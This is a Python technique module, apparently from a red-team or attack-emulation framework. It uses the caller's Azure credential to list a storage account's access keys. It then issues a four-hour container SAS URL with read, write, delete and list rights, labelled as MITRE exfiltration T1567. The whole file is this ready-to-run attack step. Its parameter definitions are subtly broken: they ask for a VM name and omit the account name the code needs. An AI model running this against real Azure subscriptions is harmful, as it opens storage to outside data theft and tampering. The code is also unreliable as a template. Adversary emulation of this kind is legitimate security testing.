from ..base_technique import BaseTechnique, ExecutionStatus, MitreTechnique, AzureTRMTechnique
from ..technique_registry import TechniqueRegistry
from typing import Dict, Any, Tuple
from azure.storage.blob import BlobServiceClient, generate_container_sas, ContainerSasPermissions
from azure.mgmt.storage import StorageManagementClient
from core.azure.azure_access import AzureAccess
from datetime import datetime, timedelta, timezone

@TechniqueRegistry.register
class AzureShareStorageAccountContainer(BaseTechnique):
    def __init__(self):
        mitre_techniques = [
            MitreTechnique(
                technique_id="T1567",
                technique_name="Exfiltration Over Web Service",
                tactics=["Exfiltration"],
                sub_technique_name=None
            )
        ]
        azure_trm_technique = [
            AzureTRMTechnique(
                technique_id="AZT701.2",
                technique_name="SAS URI Generation",
                tactics=["Impact"],
                sub_technique_name="Storage Account File Share SAS"
            )
        ]
        super().__init__("Share Storage Account Container", "Generates Shared Access Signatures (SAS) URIs specifically for containers in Azure Storage Accounts", mitre_techniques)

    def execute(self, **kwargs: Any) -> Tuple[ExecutionStatus, Dict[str, Any]]:
        self.validate_parameters(kwargs)
        try:
            rg_name: str = kwargs["rg_name"]
            account_name: str = kwargs["account_name"]
            container_name: str = kwargs["container_name"]

            # Get credential
            credential = AzureAccess.get_azure_auth_credential()
            # Retrieve subscription id
            current_sub_info = AzureAccess().get_current_subscription_info()
            subscription_id = current_sub_info.get("id")
            
            # create client
            storage_client = StorageManagementClient(credential, subscription_id)
            
            # Obtain keys
            storage_account_keys = storage_client.storage_accounts.list_keys(rg_name, account_name)
            storage_account_key = storage_account_keys.keys[0].value

            BlobServiceClient(account_url=f"https://{account_name}.blob.core.windows.net", credential={"account_name": account_name, "account_key": storage_account_key})

            # Generate SAS token for the container
            sas_token = generate_container_sas(
                account_name=account_name,
                container_name=container_name,
                account_key=storage_account_key,
                permission=ContainerSasPermissions(read=True, write=True, delete=True, list=True),
                expiry=datetime.now(timezone.utc) + timedelta(hours=4)  # Set expiry time to 4 hours
            )
            
            sas_url = f"https://{account_name}.blob.core.windows.net/{container_name}?{sas_token}"

            return ExecutionStatus.SUCCESS, {
                "message": f"Successfully generated SAS for storage account container",
                "value": {
                    "sas_url" : sas_url,
                    "resource_group" : rg_name,
                    "account" : account_name,
                    "container" : container_name
                }
            }
        except Exception as e:
            return ExecutionStatus.FAILURE, {
                "error": str(e),
                "message": "Failed to generate SAS for storage account container"
            }

    def get_parameters(self) -> Dict[str, Dict[str, Any]]:
        return {
            "vm_name": {"type": "str", "required": True, "default": None, "name": "VM Name", "input_field_type" : "text"},
            "rg_name": {"type": "str", "required": True, "default": None, "name": "Resource Group Name", "input_field_type" : "text"},
            "container_name": {"type": "str", "required": True, "default": None, "name": "Container Name", "input_field_type" : "text"}
        }